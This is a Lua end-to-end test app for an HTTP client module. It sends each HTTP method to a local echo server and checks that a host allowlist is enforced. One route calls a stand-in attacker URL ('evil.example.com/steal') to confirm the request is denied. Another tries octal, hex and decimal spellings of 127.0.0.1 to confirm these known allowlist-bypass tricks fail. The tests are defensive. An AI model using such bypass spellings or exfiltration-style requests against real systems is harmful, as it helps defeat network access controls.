-- http_client_app.lua - E2E test app for HTTP client capability
--
-- Declares hosts manifest to enable the http module,
-- then exercises all HTTP methods against an echo server.
--
-- Expects echo server running on 127.0.0.1:19860
--
-- SPDX-License-Identifier: AGPL-3.0-or-later

app.manifest({
    modules = { "hull/http-client@1", "hull/http-server@1", "hull/log@1" },
    -- The non-canonical entries exist for /test/noncanonical (audit 42):
    -- spelled exactly like the URL host, or inside 127.0.0.0/8 as libc
    -- inet_pton reads it, each used to pass the check and dial 127.0.0.1.
    hosts = {"127.0.0.1", "127.0.0.0/8", "0177.0.0.1", "127.1", "0x7f.0.0.1",
             "2130706433", "127.000.000.001"},
    env = {"ECHO_PORT"},
})

local http_client = require("hull.http-client")
local log = require("hull.log")
local ECHO_BASE = "http://127.0.0.1:19860"

-- GET /test/get - exercise http_client.get()
app.get("/test/get", function(_req, res)
    local r = http_client.get(ECHO_BASE .. "/echo")
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/post - exercise http_client.post()
app.get("/test/post", function(_req, res)
    local r = http_client.post(ECHO_BASE .. "/echo", "hello from lua", {
        headers = { ["X-Test"] = "lua-post" }
    })
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/put - exercise http_client.put()
app.get("/test/put", function(_req, res)
    local r = http_client.put(ECHO_BASE .. "/echo", "put-body")
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/patch - exercise http.patch()
app.get("/test/patch", function(_req, res)
    local r = http_client.patch(ECHO_BASE .. "/echo", "patch-body")
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/delete - exercise http_client.delete()
app.get("/test/delete", function(_req, res)
    local r = http_client.delete(ECHO_BASE .. "/echo")
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/request - exercise http_client.request() with custom method
app.get("/test/request", function(_req, res)
    local r = http_client.request("OPTIONS", ECHO_BASE .. "/echo")
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/headers - verify custom headers are sent
app.get("/test/headers", function(_req, res)
    local r = http_client.get(ECHO_BASE .. "/echo", {
        headers = { ["X-Custom-Header"] = "test-value-lua" }
    })
    res:json({ status = r.status, echo = r.body })
end)

-- GET /test/denied - verify host not in allowlist is rejected
app.get("/test/denied", function(_req, res)
    local ok, err = pcall(function()
        http_client.get("http://evil.example.com/steal")
    end)
    if ok then
        res:json({ error = "should have been denied" })
    else
        res:json({ denied = true, message = tostring(err) })
    end
end)

-- GET /test/noncanonical - an IP literal a resolver may read differently
-- from the allowlist check matches no grant (audit 42): every spelling below
-- names 127.0.0.1 to some resolver, and none may reach the echo server.
app.get("/test/noncanonical", function(_req, res)
    local reached = {}
    for _, h in ipairs({ "0177.0.0.1", "127.1", "0x7f.0.0.1", "2130706433",
                         "127.000.000.001", "127.0.0.01" }) do
        local ok, r = pcall(http_client.get,
                            "http://" .. h .. ":19860/echo", { timeout_ms = 2000 })
        if ok and r and r.status == 200 then reached[#reached + 1] = h end
    end
    local ok, r = pcall(http_client.get, ECHO_BASE .. "/echo")
    res:json({ reached = "[" .. table.concat(reached, ",") .. "]",
               canonical = (ok and r and r.status) or 0 })
end)

-- Health check for readiness
app.get("/health", function(_req, res)
    res:json({ status = "ok", runtime = "lua" })
end)

log.info("HTTP client test app loaded (Lua)")
